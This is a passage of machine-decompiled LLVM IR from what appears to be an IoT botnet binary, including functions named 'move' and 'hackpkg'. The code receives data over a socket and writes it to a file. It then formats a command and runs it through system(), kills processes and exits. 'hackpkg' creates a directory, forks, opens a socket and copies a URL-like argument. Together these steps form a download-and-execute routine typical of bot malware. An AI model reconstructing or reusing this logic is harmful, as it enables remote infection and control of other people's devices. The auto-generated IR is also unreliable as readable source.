  %v2_18b64 = load i8, i8* %v1_18b64, align 1
  %v3_18b64 = zext i8 %v2_18b64 to i32
  store i32 %v4_189f4, i32* %r1.global-to-local, align 4
  %v3_18b70 = call i32 @__GI_fputc(i32 %v3_18b64, i32 %v4_189f4, i32 %storemerge14150)
  br label %dec_label_pc_18b74

dec_label_pc_18b74:                               ; preds = %dec_label_pc_18b20, %dec_label_pc_18ae8, %dec_label_pc_18b4c
  %v1_18b78 = add i32 %storemerge14150, 1
  %v5_18b8c = icmp slt i32 %v1_18b78, %v4_18a1c
  br i1 %v5_18b8c, label %dec_label_pc_18ab8, label %dec_label_pc_18bb4.preheader

dec_label_pc_18bb4.preheader.loopexit21:          ; preds = %dec_label_pc_18a00
  %.pre40 = add i32 %v4_189f4, 52
  %.pre41 = inttoptr i32 %.pre40 to i32*
  %.pre42 = add i32 %v4_189f4, 16
  %.pre43 = inttoptr i32 %.pre42 to i32*
  %.pre44 = add i32 %v4_189f4, 28
  %.pre45 = inttoptr i32 %.pre44 to i32*
  br label %dec_label_pc_18bb4.preheader

dec_label_pc_18bb4.preheader:                     ; preds = %dec_label_pc_18aa8, %dec_label_pc_18b74, %dec_label_pc_18bb4.preheader.loopexit21
  %v2_18c4c.pre-phi = phi i32* [ %.pre45, %dec_label_pc_18bb4.preheader.loopexit21 ], [ %v2_18adc, %dec_label_pc_18b74 ], [ %v2_18adc, %dec_label_pc_18aa8 ]
  %v2_18c44.pre-phi = phi i32* [ %.pre43, %dec_label_pc_18bb4.preheader.loopexit21 ], [ %v2_18ad4, %dec_label_pc_18b74 ], [ %v2_18ad4, %dec_label_pc_18aa8 ]
  %v2_18c34.pre-phi = phi i32* [ %.pre41, %dec_label_pc_18bb4.preheader.loopexit21 ], [ %v2_18ac4, %dec_label_pc_18b74 ], [ %v2_18ac4, %dec_label_pc_18aa8 ]
  br label %dec_label_pc_18bb4

dec_label_pc_18b94:                               ; preds = %dec_label_pc_18a74
  %v1_18b98 = add nuw nsw i32 %storemerge13160, 1
  %v5_18bac = icmp slt i32 %v1_18b98, %v4_18a1c
  br i1 %v5_18bac, label %dec_label_pc_18a74, label %dec_label_pc_18a00

dec_label_pc_18bb4:                               ; preds = %dec_label_pc_18ce4, %dec_label_pc_18bb4.preheader
  store i32 %v2_18a08, i32* %r1.global-to-local, align 4
  %v4_18bd0 = call i32 @recv(i32 %v3_1866c, i32 %v2_18a08, i32 4096, i32 0)
  %tmp91 = icmp slt i32 %v4_18bd0, 1
  br i1 %tmp91, label %dec_label_pc_18d04, label %dec_label_pc_18be8

dec_label_pc_18be8:                               ; preds = %dec_label_pc_18bb4
  %v8_18bf8 = icmp sgt i32 %v4_18bd0, 4095
  br i1 %v8_18bf8, label %dec_label_pc_18c28.lr.ph, label %dec_label_pc_18bfc

dec_label_pc_18bfc:                               ; preds = %dec_label_pc_18be8
  %v2_18c10 = add i32 %v4_18bd0, %v2_18a08
  %v3_18c18 = inttoptr i32 %v2_18c10 to i8*
  store i8 0, i8* %v3_18c18, align 1
  br label %dec_label_pc_18c28.lr.ph

dec_label_pc_18c28.lr.ph:                         ; preds = %dec_label_pc_18bfc, %dec_label_pc_18be8
  br label %dec_label_pc_18c28

dec_label_pc_18c28:                               ; preds = %dec_label_pc_18c28.lr.ph, %dec_label_pc_18ce4
  %storemerge15140 = phi i32 [ 0, %dec_label_pc_18c28.lr.ph ], [ %v1_18ce8, %dec_label_pc_18ce4 ]
  %v3_18c34 = load i32, i32* %v2_18c34.pre-phi, align 4
  %v2_18c38 = icmp eq i32 %v3_18c34, 0
  br i1 %v2_18c38, label %dec_label_pc_18cbc, label %dec_label_pc_18c40

dec_label_pc_18c40:                               ; preds = %dec_label_pc_18c28
  %v3_18c44 = load i32, i32* %v2_18c44.pre-phi, align 4
  %v3_18c4c = load i32, i32* %v2_18c4c.pre-phi, align 4
  %v3_18c50 = icmp ult i32 %v3_18c44, %v3_18c4c
  br i1 %v3_18c50, label %dec_label_pc_18c58, label %dec_label_pc_18c90

dec_label_pc_18c58:                               ; preds = %dec_label_pc_18c40
  %v3_18c5c = load i32, i32* %v2_18c44.pre-phi, align 4
  store i32 %v3_18c5c, i32* %r1.global-to-local, align 4
  store i32 %v2_185b4, i32* @lr, align 4
  %v2_18c74 = add i32 %storemerge15140, %v2_18a08
  %v1_18c78 = inttoptr i32 %v2_18c74 to i8*
  %v2_18c78 = load i8, i8* %v1_18c78, align 1
  %v3_18c7c = inttoptr i32 %v3_18c5c to i8*
  store i8 %v2_18c78, i8* %v3_18c7c, align 1
  %v0_18c80 = load i32, i32* %r1.global-to-local, align 4
  %v1_18c80 = add i32 %v0_18c80, 1
  store i32 %v1_18c80, i32* %v2_18c44.pre-phi, align 4
  br label %dec_label_pc_18ce4

dec_label_pc_18c90:                               ; preds = %dec_label_pc_18c40
  %v2_18ca4 = add i32 %storemerge15140, %v2_18a08
  %v1_18ca8 = inttoptr i32 %v2_18ca4 to i8*
  %v2_18ca8 = load i8, i8* %v1_18ca8, align 1
  store i32 %v4_189f4, i32* %r1.global-to-local, align 4
  %v3_18cb4 = call i32 @putc_unlocked(i8 %v2_18ca8, i32 %v4_189f4)
  br label %dec_label_pc_18ce4

dec_label_pc_18cbc:                               ; preds = %dec_label_pc_18c28
  store i32 %v2_185b4, i32* %r1.global-to-local, align 4
  %v2_18cd0 = add i32 %storemerge15140, %v2_18a08
  %v1_18cd4 = inttoptr i32 %v2_18cd0 to i8*
  %v2_18cd4 = load i8, i8* %v1_18cd4, align 1
  %v3_18cd4 = zext i8 %v2_18cd4 to i32
  store i32 %v4_189f4, i32* %r1.global-to-local, align 4
  %v3_18ce0 = call i32 @__GI_fputc(i32 %v3_18cd4, i32 %v4_189f4, i32 %storemerge15140)
  br label %dec_label_pc_18ce4

dec_label_pc_18ce4:                               ; preds = %dec_label_pc_18c90, %dec_label_pc_18c58, %dec_label_pc_18cbc
  %v1_18ce8 = add nuw nsw i32 %storemerge15140, 1
  %v5_18cfc = icmp slt i32 %v1_18ce8, %v4_18bd0
  br i1 %v5_18cfc, label %dec_label_pc_18c28, label %dec_label_pc_18bb4

dec_label_pc_18d04:                               ; preds = %dec_label_pc_18bb4
  %v1_18d08 = inttoptr i32 %v4_189f4 to i16*
  %v2_18d08 = call i32 @__GI_fclose(i16* %v1_18d08)
  %v2_18d10 = ptrtoint i32* %stack_var_-1144 to i32
  store i32 %v2_18d10, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  %v0_18d20 = call i32 @__GI_memset()
  store i32 %v2_18d10, i32* @r0, align 4
  store i32 ptrtoint ([70 x i8]* @global_var_38bb8.900 to i32), i32* %r1.global-to-local, align 4
  %v4_18d44 = call i32 @sprintf(i32 %v2_18d10, i32 ptrtoint ([70 x i8]* @global_var_38bb8.900 to i32), i32 ptrtoint (i32* @global_var_525bc.898 to i32))
  br label %dec_label_pc_1909c

dec_label_pc_18d4c:                               ; preds = %dec_label_pc_18988
  store i32 ptrtoint ([8 x i8]* @global_var_38c00.902 to i32), i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_36ce0.71 to i32), i32* @r1, align 4
  %v4_18d54 = call i32 @__GI_fopen(i32 ptrtoint ([8 x i8]* @global_var_38c00.902 to i32), i32 ptrtoint ([3 x i8]* @global_var_36ce0.71 to i32))
  %v2_18d68 = ptrtoint i32* %stack_var_-5240 to i32
  br label %dec_label_pc_18d60

dec_label_pc_18d60:                               ; preds = %dec_label_pc_18ef4, %dec_label_pc_18d4c
  store i32 %v2_18d68, i32* %r1.global-to-local, align 4
  %v4_18d7c = call i32 @recv(i32 %v3_1866c, i32 %v2_18d68, i32 4096, i32 0)
  %tmp93 = icmp slt i32 %v4_18d7c, 1
  br i1 %tmp93, label %dec_label_pc_18f14.preheader.loopexit20, label %dec_label_pc_18d94

dec_label_pc_18d94:                               ; preds = %dec_label_pc_18d60
  %v8_18da4 = icmp sgt i32 %v4_18d7c, 4095
  br i1 %v8_18da4, label %dec_label_pc_18dd4.lr.ph, label %dec_label_pc_18da8

dec_label_pc_18da8:                               ; preds = %dec_label_pc_18d94
  %v2_18dbc = add i32 %v4_18d7c, %v2_18d68
  %v3_18dc4 = inttoptr i32 %v2_18dbc to i8*
  store i8 0, i8* %v3_18dc4, align 1
  br label %dec_label_pc_18dd4.lr.ph

dec_label_pc_18dd4.lr.ph:                         ; preds = %dec_label_pc_18da8, %dec_label_pc_18d94
  br label %dec_label_pc_18dd4

dec_label_pc_18dd4:                               ; preds = %dec_label_pc_18dd4.lr.ph, %dec_label_pc_18ef4
  %storemerge16130 = phi i32 [ 0, %dec_label_pc_18dd4.lr.ph ], [ %v1_18ef8, %dec_label_pc_18ef4 ]
  %v2_18de8 = add i32 %storemerge16130, %v2_18d68
  store i32 ptrtoint ([5 x i8]* @global_var_36ce4.73 to i32), i32* @r1, align 4
  %v4_18df8 = inttoptr i32 %v2_18de8 to i8*
  %v5_18df8 = call i32 @__GI_strncmp(i8* %v4_18df8, i32 ptrtoint ([5 x i8]* @global_var_36ce4.73 to i32), i32 4)
  %v2_18e00 = icmp eq i32 %v5_18df8, 0
  br i1 %v2_18e00, label %dec_label_pc_18e08, label %dec_label_pc_18ef4

dec_label_pc_18e08:                               ; preds = %dec_label_pc_18dd4
  %v1_18e0c = add i32 %storemerge16130, 4
  %v1_18e24 = add i32 %v4_18d54, 52
  %v2_18e24 = inttoptr i32 %v1_18e24 to i32*
  %v1_18e34 = add i32 %v4_18d54, 16
  %v2_18e34 = inttoptr i32 %v1_18e34 to i32*
  %v1_18e3c = add i32 %v4_18d54, 28
  %v2_18e3c = inttoptr i32 %v1_18e3c to i32*
  %v5_18eec119 = icmp slt i32 %v1_18e0c, %v4_18d7c
  br i1 %v5_18eec119, label %dec_label_pc_18e18, label %dec_label_pc_18f14.preheader

dec_label_pc_18e18:                               ; preds = %dec_label_pc_18e08, %dec_label_pc_18ed4
  %storemerge17120 = phi i32 [ %v1_18ed8, %dec_label_pc_18ed4 ], [ %v1_18e0c, %dec_label_pc_18e08 ]
  %v3_18e24 = load i32, i32* %v2_18e24, align 4
  %v2_18e28 = icmp eq i32 %v3_18e24, 0
  br i1 %v2_18e28, label %dec_label_pc_18eac, label %dec_label_pc_18e30

dec_label_pc_18e30:                               ; preds = %dec_label_pc_18e18
  %v3_18e34 = load i32, i32* %v2_18e34, align 4
  %v3_18e3c = load i32, i32* %v2_18e3c, align 4
  %v3_18e40 = icmp ult i32 %v3_18e34, %v3_18e3c
  br i1 %v3_18e40, label %dec_label_pc_18e48, label %dec_label_pc_18e80

dec_label_pc_18e48:                               ; preds = %dec_label_pc_18e30
  %v3_18e4c = load i32, i32* %v2_18e34, align 4
  store i32 %v3_18e4c, i32* %r1.global-to-local, align 4
  store i32 %v2_185b4, i32* @lr, align 4
  %v2_18e64 = add i32 %storemerge17120, %v2_18d68
  %v1_18e68 = inttoptr i32 %v2_18e64 to i8*
  %v2_18e68 = load i8, i8* %v1_18e68, align 1
  %v3_18e6c = inttoptr i32 %v3_18e4c to i8*
  store i8 %v2_18e68, i8* %v3_18e6c, align 1
  %v0_18e70 = load i32, i32* %r1.global-to-local, align 4
  %v1_18e70 = add i32 %v0_18e70, 1
  store i32 %v1_18e70, i32* %v2_18e34, align 4
  br label %dec_label_pc_18ed4

dec_label_pc_18e80:                               ; preds = %dec_label_pc_18e30
  %v2_18e94 = add i32 %storemerge17120, %v2_18d68
  %v1_18e98 = inttoptr i32 %v2_18e94 to i8*
  %v2_18e98 = load i8, i8* %v1_18e98, align 1
  store i32 %v4_18d54, i32* %r1.global-to-local, align 4
  %v3_18ea4 = call i32 @putc_unlocked(i8 %v2_18e98, i32 %v4_18d54)
  br label %dec_label_pc_18ed4

dec_label_pc_18eac:                               ; preds = %dec_label_pc_18e18
  store i32 %v2_185b4, i32* %r1.global-to-local, align 4
  %v2_18ec0 = add i32 %storemerge17120, %v2_18d68
  %v1_18ec4 = inttoptr i32 %v2_18ec0 to i8*
  %v2_18ec4 = load i8, i8* %v1_18ec4, align 1
  %v3_18ec4 = zext i8 %v2_18ec4 to i32
  store i32 %v4_18d54, i32* %r1.global-to-local, align 4
  %v3_18ed0 = call i32 @__GI_fputc(i32 %v3_18ec4, i32 %v4_18d54, i32 %storemerge17120)
  br label %dec_label_pc_18ed4

dec_label_pc_18ed4:                               ; preds = %dec_label_pc_18e80, %dec_label_pc_18e48, %dec_label_pc_18eac
  %v1_18ed8 = add i32 %storemerge17120, 1
  %v5_18eec = icmp slt i32 %v1_18ed8, %v4_18d7c
  br i1 %v5_18eec, label %dec_label_pc_18e18, label %dec_label_pc_18f14.preheader

dec_label_pc_18f14.preheader.loopexit20:          ; preds = %dec_label_pc_18d60
  %.pre = add i32 %v4_18d54, 52
  %.pre35 = inttoptr i32 %.pre to i32*
  %.pre36 = add i32 %v4_18d54, 16
  %.pre37 = inttoptr i32 %.pre36 to i32*
  %.pre38 = add i32 %v4_18d54, 28
  %.pre39 = inttoptr i32 %.pre38 to i32*
  br label %dec_label_pc_18f14.preheader

dec_label_pc_18f14.preheader:                     ; preds = %dec_label_pc_18e08, %dec_label_pc_18ed4, %dec_label_pc_18f14.preheader.loopexit20
  %v2_18fac.pre-phi = phi i32* [ %.pre39, %dec_label_pc_18f14.preheader.loopexit20 ], [ %v2_18e3c, %dec_label_pc_18ed4 ], [ %v2_18e3c, %dec_label_pc_18e08 ]
  %v2_18fa4.pre-phi = phi i32* [ %.pre37, %dec_label_pc_18f14.preheader.loopexit20 ], [ %v2_18e34, %dec_label_pc_18ed4 ], [ %v2_18e34, %dec_label_pc_18e08 ]
  %v2_18f94.pre-phi = phi i32* [ %.pre35, %dec_label_pc_18f14.preheader.loopexit20 ], [ %v2_18e24, %dec_label_pc_18ed4 ], [ %v2_18e24, %dec_label_pc_18e08 ]
  br label %dec_label_pc_18f14

dec_label_pc_18ef4:                               ; preds = %dec_label_pc_18dd4
  %v1_18ef8 = add nuw nsw i32 %storemerge16130, 1
  %v5_18f0c = icmp slt i32 %v1_18ef8, %v4_18d7c
  br i1 %v5_18f0c, label %dec_label_pc_18dd4, label %dec_label_pc_18d60

dec_label_pc_18f14:                               ; preds = %dec_label_pc_19044, %dec_label_pc_18f14.preheader
  store i32 %v2_18d68, i32* %r1.global-to-local, align 4
  %v4_18f30 = call i32 @recv(i32 %v3_1866c, i32 %v2_18d68, i32 4096, i32 0)
  %tmp95 = icmp slt i32 %v4_18f30, 1
  br i1 %tmp95, label %dec_label_pc_19064, label %dec_label_pc_18f48

dec_label_pc_18f48:                               ; preds = %dec_label_pc_18f14
  %v8_18f58 = icmp sgt i32 %v4_18f30, 4095
  br i1 %v8_18f58, label %dec_label_pc_18f88.lr.ph, label %dec_label_pc_18f5c

dec_label_pc_18f5c:                               ; preds = %dec_label_pc_18f48
  %v2_18f70 = add i32 %v4_18f30, %v2_18d68
  %v3_18f78 = inttoptr i32 %v2_18f70 to i8*
  store i8 0, i8* %v3_18f78, align 1
  br label %dec_label_pc_18f88.lr.ph

dec_label_pc_18f88.lr.ph:                         ; preds = %dec_label_pc_18f5c, %dec_label_pc_18f48
  br label %dec_label_pc_18f88

dec_label_pc_18f88:                               ; preds = %dec_label_pc_18f88.lr.ph, %dec_label_pc_19044
  %storemerge18110 = phi i32 [ 0, %dec_label_pc_18f88.lr.ph ], [ %v1_19048, %dec_label_pc_19044 ]
  %v3_18f94 = load i32, i32* %v2_18f94.pre-phi, align 4
  %v2_18f98 = icmp eq i32 %v3_18f94, 0
  br i1 %v2_18f98, label %dec_label_pc_1901c, label %dec_label_pc_18fa0

dec_label_pc_18fa0:                               ; preds = %dec_label_pc_18f88
  %v3_18fa4 = load i32, i32* %v2_18fa4.pre-phi, align 4
  %v3_18fac = load i32, i32* %v2_18fac.pre-phi, align 4
  %v3_18fb0 = icmp ult i32 %v3_18fa4, %v3_18fac
  br i1 %v3_18fb0, label %dec_label_pc_18fb8, label %dec_label_pc_18ff0

dec_label_pc_18fb8:                               ; preds = %dec_label_pc_18fa0
  %v3_18fbc = load i32, i32* %v2_18fa4.pre-phi, align 4
  store i32 %v3_18fbc, i32* %r1.global-to-local, align 4
  store i32 %v2_185b4, i32* @lr, align 4
  %v2_18fd4 = add i32 %storemerge18110, %v2_18d68
  %v1_18fd8 = inttoptr i32 %v2_18fd4 to i8*
  %v2_18fd8 = load i8, i8* %v1_18fd8, align 1
  %v3_18fdc = inttoptr i32 %v3_18fbc to i8*
  store i8 %v2_18fd8, i8* %v3_18fdc, align 1
  %v0_18fe0 = load i32, i32* %r1.global-to-local, align 4
  %v1_18fe0 = add i32 %v0_18fe0, 1
  store i32 %v1_18fe0, i32* %v2_18fa4.pre-phi, align 4
  br label %dec_label_pc_19044

dec_label_pc_18ff0:                               ; preds = %dec_label_pc_18fa0
  %v2_19004 = add i32 %storemerge18110, %v2_18d68
  %v1_19008 = inttoptr i32 %v2_19004 to i8*
  %v2_19008 = load i8, i8* %v1_19008, align 1
  store i32 %v4_18d54, i32* %r1.global-to-local, align 4
  %v3_19014 = call i32 @putc_unlocked(i8 %v2_19008, i32 %v4_18d54)
  br label %dec_label_pc_19044

dec_label_pc_1901c:                               ; preds = %dec_label_pc_18f88
  store i32 %v2_185b4, i32* %r1.global-to-local, align 4
  %v2_19030 = add i32 %storemerge18110, %v2_18d68
  %v1_19034 = inttoptr i32 %v2_19030 to i8*
  %v2_19034 = load i8, i8* %v1_19034, align 1
  %v3_19034 = zext i8 %v2_19034 to i32
  store i32 %v4_18d54, i32* %r1.global-to-local, align 4
  %v3_19040 = call i32 @__GI_fputc(i32 %v3_19034, i32 %v4_18d54, i32 %storemerge18110)
  br label %dec_label_pc_19044

dec_label_pc_19044:                               ; preds = %dec_label_pc_18ff0, %dec_label_pc_18fb8, %dec_label_pc_1901c
  %v1_19048 = add nuw nsw i32 %storemerge18110, 1
  %v5_1905c = icmp slt i32 %v1_19048, %v4_18f30
  br i1 %v5_1905c, label %dec_label_pc_18f88, label %dec_label_pc_18f14

dec_label_pc_19064:                               ; preds = %dec_label_pc_18f14
  %v1_19068 = inttoptr i32 %v4_18d54 to i16*
  %v2_19068 = call i32 @__GI_fclose(i16* %v1_19068)
  %v2_19070 = ptrtoint i32* %stack_var_-1144 to i32
  store i32 %v2_19070, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  %v0_19080 = call i32 @__GI_memset()
  store i32 %v2_19070, i32* @r3, align 4
  store i32 %v2_19070, i32* @r0, align 4
  store i32 ptrtoint ([188 x i8]* @global_var_38c08.904 to i32), i32* @r1, align 4
  store i32 188, i32* @r2, align 4
  %v0_19098 = call i32 @memcpy()
  br label %dec_label_pc_1909c

dec_label_pc_1909c:                               ; preds = %dec_label_pc_18d04, %dec_label_pc_19064
  %v2_190bc.pre-phi = phi i32 [ %v2_18d10, %dec_label_pc_18d04 ], [ %v2_19070, %dec_label_pc_19064 ]
  %v1_190ac = call i32 @close(i32 %arg1)
  %v1_190b4 = call i32 @close(i32 %v3_1866c)
  %v1_190c4 = call i32 @system(i32 %v2_190bc.pre-phi)
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_190d0 = call i32 @kill(i32 9, i32 0)
  %v1_190d8 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_190dc

dec_label_pc_190dc:                               ; preds = %entry, %dec_label_pc_1909c
  %v1_190e4 = phi i32 [ %v1_18608, %entry ], [ %v1_190d8, %dec_label_pc_1909c ]
  ret i32 %v1_190e4

; uselistorder directives
  uselistorder i32 %storemerge18110, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v4_18f30, { 1, 0, 2, 3 }
  uselistorder i32* %v2_18fa4.pre-phi, { 2, 1, 0 }
  uselistorder i32 %v1_18ed8, { 1, 0 }
  uselistorder i32 %storemerge17120, { 1, 0, 4, 3, 2 }
  uselistorder i32 %storemerge16130, { 1, 0, 2 }
  uselistorder i32 %v4_18d7c, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32 %v2_18d68, { 0, 1, 2, 3, 10, 9, 4, 5, 6, 7, 8, 12, 11 }
  uselistorder i32 %v4_18d54, { 14, 13, 12, 11, 10, 0, 1, 2, 8, 7, 4, 3, 6, 5, 9 }
  uselistorder i32 %storemerge15140, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v4_18bd0, { 1, 0, 2, 3 }
  uselistorder i32* %v2_18c44.pre-phi, { 2, 1, 0 }
  uselistorder i32 %v1_18b78, { 1, 0 }
  uselistorder i32 %storemerge14150, { 1, 0, 4, 3, 2 }
  uselistorder i32 %storemerge13160, { 1, 0, 2 }
  uselistorder i32 %v4_18a1c, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32 %v2_18a08, { 0, 1, 2, 3, 10, 9, 4, 5, 6, 7, 8, 12, 11 }
  uselistorder i32 %v4_189f4, { 14, 13, 12, 11, 10, 0, 1, 2, 8, 7, 4, 3, 6, 5, 9 }
  uselistorder i32 %storemerge11, { 1, 0, 2, 4, 3 }
  uselistorder i32* %v1_188c8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_18824, { 1, 0, 2, 3 }
  uselistorder i32 %v4_18808, { 0, 2, 1, 3 }
  uselistorder i32 %v2_187b0, { 1, 0 }
  uselistorder i32 %v3_1866c, { 2, 3, 4, 0, 1, 5, 6, 7 }
  uselistorder i32 %v2_185b4, { 10, 9, 8, 7, 6, 5, 4, 3, 11, 2, 1, 12, 13, 0, 14, 15, 16 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-120, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0 }
  uselistorder i32 ptrtoint ([276 x i8]* @global_var_36bb0.67 to i32), { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 2, 1, 3, 4, 0, 5, 6 }
  uselistorder i32 %arg1, { 2, 3, 1, 4, 5, 0 }
  uselistorder label %dec_label_pc_190dc, { 1, 0 }
  uselistorder label %dec_label_pc_1909c, { 1, 0 }
  uselistorder label %dec_label_pc_19044, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18f88, { 1, 0 }
  uselistorder label %dec_label_pc_18f14.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18ed4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18e18, { 1, 0 }
  uselistorder label %dec_label_pc_18dd4, { 1, 0 }
  uselistorder label %dec_label_pc_18ce4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18c28, { 1, 0 }
  uselistorder label %dec_label_pc_18bb4.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18b74, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18ab8, { 1, 0 }
  uselistorder label %dec_label_pc_18a74, { 1, 0 }
  uselistorder label %dec_label_pc_18988, { 1, 0 }
  uselistorder label %dec_label_pc_1890c, { 1, 0 }
  uselistorder label %dec_label_pc_188b0, { 1, 0 }
  uselistorder label %dec_label_pc_188b0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_18800, { 1, 0 }
  uselistorder label %dec_label_pc_18798, { 1, 0 }
  uselistorder label %dec_label_pc_18764, { 1, 0 }
  uselistorder label %dec_label_pc_186b4, { 1, 0 }
  uselistorder label %dec_label_pc_18660, { 1, 0 }
}

define i32 @move(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 102712, i32* %stack_var_-4, align 4
  %v2_19134 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_19134, i32* @fp, align 4
  store i32 %arg4, i32* %stack_var_-32, align 4
  %v5_19154 = icmp sgt i32 %arg3, 0
  br i1 %v5_19154, label %dec_label_pc_19170, label %dec_label_pc_19158

dec_label_pc_19158:                               ; preds = %entry
  store i32 %arg2, i32* @r2, align 4
  %v3_19164 = call i32 @Send(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_38cc4.906 to i32))
  %v1_1916c = call i32 @__GI_exit(i32 1)
  %v3_19170.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_19170

dec_label_pc_19170:                               ; preds = %entry, %dec_label_pc_19158
  %v3_19170 = phi i32 [ %arg4, %entry ], [ %v3_19170.pre, %dec_label_pc_19158 ]
  %v1_19174 = add i32 %v3_19170, 4
  %v1_19178 = inttoptr i32 %v1_19174 to i32*
  %v2_19178 = load i32, i32* %v1_19178, align 4
  %v1_19180 = inttoptr i32 %v2_19178 to i8*
  %v2_19180 = call i32 @__GI_strdup(i8* %v1_19180)
  store i32 %v2_19180, i32* @global_var_526c0.908, align 4
  store i32 1, i32* @global_var_49b38.910, align 4
  %v1_191a4 = call i32 @close(i32 %arg1)
  ret i32 %v1_191a4

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_19170, { 1, 0 }
}

define i32 @hackpkg(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-6224 = alloca i32, align 4
  %stack_var_-5969 = alloca i32, align 4
  %stack_var_-5714 = alloca i32, align 4
  %stack_var_-5459 = alloca i32, align 4
  %stack_var_-5204 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-1108 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-6240 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 102860, i32* %stack_var_-4, align 4
  %v2_191c8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_191c8, i32* @fp, align 4
  %v2_191dc = ptrtoint i32* %stack_var_-24 to i32
  %v3_191f0 = add i32 %v2_191dc, -6208
  %v4_191f0 = inttoptr i32 %v3_191f0 to i32*
  store i32 %arg2, i32* %v4_191f0, align 4
  store i32 %v2_191dc, i32* @lr, align 4
  store i32 %arg4, i32* %stack_var_-6240, align 4
  store i32 509, i32* %r1.global-to-local, align 4
  %v4_19220 = call i32 @mkdir(i32 ptrtoint ([9 x i8]* @global_var_38ce0.912 to i32), i32 509, i32 -6216)
  store i32 %v2_191dc, i32* %r1.global-to-local, align 4
  %v4_19230 = load i32, i32* %v4_191f0, align 4
  %v1_19234 = call i32 @mfork(i32 %v4_19230)
  %v2_1923c = icmp eq i32 %v1_19234, 0
  br i1 %v2_1923c, label %dec_label_pc_19244, label %dec_label_pc_19a44

dec_label_pc_19244:                               ; preds = %entry
  %v8_19258 = icmp sgt i32 %arg3, 1
  br i1 %v8_19258, label %dec_label_pc_1928c, label %dec_label_pc_1925c

dec_label_pc_1925c:                               ; preds = %dec_label_pc_19244
  store i32 ptrtoint ([40 x i8]* @global_var_38cec.914 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_191dc, i32* @lr, align 4
  %v4_1927c = load i32, i32* %v4_191f0, align 4
  store i32 %v4_1927c, i32* @r2, align 4
  %v3_19280 = call i32 @Send(i32 %arg1, i32 ptrtoint ([40 x i8]* @global_var_38cec.914 to i32))
  %v1_19288 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_1928c

dec_label_pc_1928c:                               ; preds = %dec_label_pc_19244, %dec_label_pc_1925c
  store i32 1, i32* %r1.global-to-local, align 4
  %v3_19298 = call i32 @socket(i32 2, i32 1, i32 0)
  %v3_192a8 = icmp eq i32 %v3_19298, -1
  br i1 %v3_192a8, label %dec_label_pc_192b0, label %dec_label_pc_192e0

dec_label_pc_192b0:                               ; preds = %dec_label_pc_1928c
  store i32 ptrtoint ([37 x i8]* @global_var_36b30.59 to i32), i32* %r1.global-to-local, align 4
  %v4_192d0 = load i32, i32* %v4_191f0, align 4
  store i32 %v4_192d0, i32* @r2, align 4
  %v3_192d4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_36b30.59 to i32))
  %v1_192dc = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_192e0

dec_label_pc_192e0:                               ; preds = %dec_label_pc_1928c, %dec_label_pc_192b0
  %v4_192ec = load i32, i32* %stack_var_-6240, align 4
  %v1_192f0 = add i32 %v4_192ec, 4
  %v1_192f4 = inttoptr i32 %v1_192f0 to i32*
  %v2_192f4 = load i32, i32* %v1_192f4, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_36b58.61 to i32), i32* @r1, align 4
  %v4_19304 = inttoptr i32 %v2_192f4 to i8*
  %v5_19304 = call i32 @__GI_strncmp(i8* %v4_19304, i32 ptrtoint ([8 x i8]* @global_var_36b58.61 to i32), i32 7)
  %v2_1930c = icmp eq i32 %v5_19304, 0
  br i1 %v2_1930c, label %dec_label_pc_19314, label %dec_label_pc_1934c

dec_label_pc_19314:                               ; preds = %dec_label_pc_192e0
  store i32 %v2_191dc, i32* @lr, align 4
  %v4_19320 = load i32, i32* %stack_var_-6240, align 4
  %v1_19324 = add i32 %v4_19320, 4
  %v1_19328 = inttoptr i32 %v1_19324 to i32*
  %v2_19328 = load i32, i32* %v1_19328, align 4
  %v1_1932c = add i32 %v2_19328, 7
  store i32 %v1_1932c, i32* @r1, align 4
  %v2_19344 = bitcast i32* %stack_var_-1108 to i8*
  %v3_19344 = call i32 @strcpy(i8* %v2_19344, i32 %v1_1932c)
